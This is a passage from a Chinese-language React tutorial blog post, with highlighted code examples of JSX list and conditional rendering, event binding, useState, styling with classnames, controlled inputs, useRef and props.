#D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091632425.png" alt="image-20241109163225388"></p><p>其中 <code>&lt;div style={{ color: 'blue' }}&gt;早上好，夜之城。&lt;/div&gt;</code> 的 style 的第一层大括号是识别 JS 表达式，用于识别包含 color 属性的对象。</p><div class="note warning flat"><p>warning</p><p>if 语句、switch 语句、变量声明等属于语句，不是表达式，不能出现在大括号 {} 中</p></div><h2 id="jsx-实现列表渲染"><a class="markdownIt-Anchor" href="#jsx-实现列表渲染"></a> JSX 实现列表渲染</h2><p>渲染需求：</p><figure class="shiki html"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">ul</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">凯瑟琳：数学家</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">马里奥：化学家</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">凯西里：化学家</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">沃尔特：化学家</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">苏布拉马妮阳：化学家</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">ul</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>在 JSX 中可以使用原生 JS 的 map 方法变量渲染：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">list</span><span style="color: #D4D4D4"> = [</span></span><span class="line"><span style="color: #D4D4D4">  { </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"John"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">age:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">25</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">  { </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"Mary"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">age:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">30</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">  { </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"Tom"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">age:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">28</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">  { </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"Jane"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">age:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">23</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">  { </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"Bob"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">age:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">35</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">Simple Title</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h1</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">ul</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">map</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">li</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #569CD6">}</span><span style="color: #D4D4D4"> - </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">age</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        ))</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">ul</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><div class="note warning flat"><p>warning</p><p><code>key</code> 应当是独一无二的，该值供 React 内部使用，提升列表更新性能</p></div><h2 id="jsx-条件渲染"><a class="markdownIt-Anchor" href="#jsx-条件渲染"></a> JSX 条件渲染</h2><p>语法：在 React 中，可以通过逻辑与运算符 <code>&amp;&amp;</code>、三元表达式 <code>(?:)</code> 实现基础的条件渲染</p><ol><li>逻辑与：<code>{flag &amp;&amp; &lt;span&gt;flag为真则显示span&lt;/span&gt;}</code></li><li>三元表达式：<code>{loading ? &lt;span&gt;loading...&lt;/span&gt; : &lt;span&gt;show&lt;/span&gt;}</code></li></ol><p><strong>复杂条件下，可以使用自定义函数返回不同结果的 jsx 模板来实现需求。</strong></p><h2 id="react-基础事件绑定"><a class="markdownIt-Anchor" href="#react-基础事件绑定"></a> React 基础事件绑定</h2><h3 id="基础绑定"><a class="markdownIt-Anchor" href="#基础绑定"></a> 基础绑定</h3><p>语法：on + 事件名称 ={事件处理程序}，整体上遵循驼峰命名法（如：handleClick）</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091708950.png" alt="image-20241109170842883" style="zoom:50%;"><h3 id="获取事件"><a class="markdownIt-Anchor" href="#获取事件"></a> 获取事件</h3><p>语法：在事件回调函数中写上形参 e</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091711394.png" alt="image-20241109171126332" style="zoom:50%;"><h3 id="传递自定义参数"><a class="markdownIt-Anchor" href="#传递自定义参数"></a> 传递自定义参数</h3><p>语法：在绑定事件中改写为箭头函数写法，将实参传递</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091713205.png" alt="image-20241109171347125" style="zoom:50%;"><h3 id="传递自定义参数和事件"><a class="markdownIt-Anchor" href="#传递自定义参数和事件"></a> 传递自定义参数和事件</h3><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091715686.png" alt="image-20241109171510601" style="zoom:50%;"><div class="note warning flat"><p>warning</p><p>请注意自定义参数和事件参数 e 的位置。传递和接收须一一对应。</p></div><h2 id="react-组件"><a class="markdownIt-Anchor" href="#react-组件"></a> React 组件</h2><p>在 React 中，一个组件就是<strong>首字母大写</strong>的函数，内部存放了组件的逻辑和视图 UI，渲染组件只需要把组件当成标签书写即可。</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091724366.png" alt="image-20241109172427287" style="zoom:50%;"><div class="note warning flat"><p>warning</p><p>请注意声明和使用时，组件名首字母大写。</p></div><h2 id="usestate-基础使用"><a class="markdownIt-Anchor" href="#usestate-基础使用"></a> useState 基础使用</h2><p>usestate 是 - 一个 ReactHook（函数），它允许我们向组件添加一个<strong>状态变量</strong>，从而控制影响组件的渲染结果。</p><p>本质：和普通 JS 变量不同的是，状态变量一旦发生变化组件的视图 UI 也会跟着变化（<strong>数据驱动视图</strong>）。</p><p>例如：<code>const [count, setCount] = useState(0)</code></p><ol><li>useState 是一个函数，返回值是一个数组。</li><li>数组中的第一个参数是状态变量，第二个参数是 set 函数用来修改状态变量</li><li> useState 的参数将作为 count 的初始值</li></ol><p>简单案例：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091735328.png" alt="image-20241109173503242" style="zoom:50%;"><div class="note warning flat"><p>warning</p><ol><li>请先将 useState 进行导入</li><li>请注意使用 setCount 时，传递的值为新值，不能使用 <code>count++</code> 或者 <code>count += 1</code> 等类似写法。</li></ol></div><h2 id="修改状态的规则"><a class="markdownIt-Anchor" href="#修改状态的规则"></a> 修改状态的规则</h2><p>前文提到，使用 setCount 时，传递的值为新值，不能使用 <code>count++</code> 或者 <code>count += 1</code> 等类似写法。</p><div class="note info flat"><p>info</p><p>在 React 中，状态被认为是只读的，我们应该始终替换它而不是修改它，直接修改状态不能引发视图更新。</p></div><p>即，你不能使用以下方式更改 count 的值：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091743217.png" alt="image-20241109174316164" style="zoom:50%;"><p>于是，修改对象这种复杂类型的状态变量，也同样适用。</p><h3 id="复杂类型修改"><a class="markdownIt-Anchor" href="#复杂类型修改"></a> 复杂类型修改</h3><div class="note info flat"><p>info</p><p>在 React 中，对于对象类型的状态变量，应该始终传给 set 方法一个<strong>全新的对象</strong>来进行修改。</p></div><p>例如：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411091753859.png" alt="image-20241109175314730"></p><p>其中的 setUser 方法将属性展开，再书写要覆盖的属性进行赋值，这样就完成了实际上的属性修改，如果不展开，那么属性将只剩下后书写的属性。</p><h2 id="react-样式控制"><a class="markdownIt-Anchor" href="#react-样式控制"></a> React 样式控制</h2><p>一般分为行内写法和分离写法。</p><p>行内写法例如：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411092143167.png" alt="image-20241109214302038" style="zoom:50%;"><p>或者像前面的写法一样，写成：<code>&lt;span style = {{ color: red }}&gt;</code></p><p>分离写法的意思是，将样式抽离为一个 css 文件进行导入使用。具体是在标签上使用 <code>className</code>（此为固定名）进行导入使用。例如：</p><figure class="shiki css"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D7BA7D">.foo</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">red</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411092147084.png" alt="image-20241109214659938" style="zoom:50%;"><h2 id="classnames-类名控制"><a class="markdownIt-Anchor" href="#classnames-类名控制"></a> classnames 类名控制</h2><blockquote><p>github 地址：<a href="https://github.com/JedWatson/classnames">https://github.com/JedWatson/classnames</a></p></blockquote><p>可以使用 classnames 进行类名控制，解决类名控制时使用模板字符串拼接类名过多时的拼接易出错、不直观的问题。</p><p>例如这种类名写法：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">type</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"admin"</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 该值可以是接收到的后端数据，这里只是示例</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #CE9178">`spanTitle</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"admin"</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #CE9178">"active"</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        This is John wick.</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>如果使用 classnames 则为：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">type</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"admin"</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 该值可以是接收到的后端数据，这里只是示例</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #DCDCAA">classNames</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"spanTitle"</span><span style="color: #D4D4D4">, { </span><span style="color: #9CDCFE">active:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"admin"</span><span style="color: #D4D4D4"> })</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        This is John wick.</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><h2 id="react-表单受控绑定"><a class="markdownIt-Anchor" href="#react-表单受控绑定"></a> React 表单受控绑定</h2><p>概念：使用 React 组件的状态（useState）控制表单的状态。</p><p>就是使用 useState 的 value 绑定输入框的 value，再通过 onChange 事件将输入的值传给 set 方法，实现输入数据视图更新的操作。例如：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useState</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">name</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">setName</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useState</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">input</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"text"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onChange</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">setName</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">target</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">)</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">input</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4"> ? { </span><span style="color: #9CDCFE">display:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"none"</span><span style="color: #D4D4D4"> } : {}</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        Hello, The name is </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">name</span><span style="color: #569CD6">}</span><span style="color: #D4D4D4">!</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>一旦输入框输入值，span 标签将会显示值。</p><h2 id="react-获取-dom"><a class="markdownIt-Anchor" href="#react-获取-dom"></a> React 获取 Dom</h2><p>在 React 组件中获取 / 操作 DOM，需要使用 useRef 钩子函数：</p><ol><li>使用 useRef 创建 ref 对象，并与 JSX 绑定</li><li>在 DOM 可用时，通过 inputRef.current 拿到 DOM 对象 </li></ol><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useRef</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">domRef</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">useRef</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">showDom</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">domRef</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">current</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dir</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">domRef</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">current</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">input</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"text"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">ref</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">domRef</span><span style="color: #569CD6">}</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">showDom</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">获取dom</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><h2 id="react-父子通信"><a class="markdownIt-Anchor" href="#react-父子通信"></a> React 父子通信</h2><h3 id="父传子"><a class="markdownIt-Anchor" href="#父传子"></a> 父传子</h3><ol><li>子组件标签上通过属性绑定数据</li><li>子组件通过 props 形参接收数据对象 </li></ol><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Son</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">props</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"Son"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: 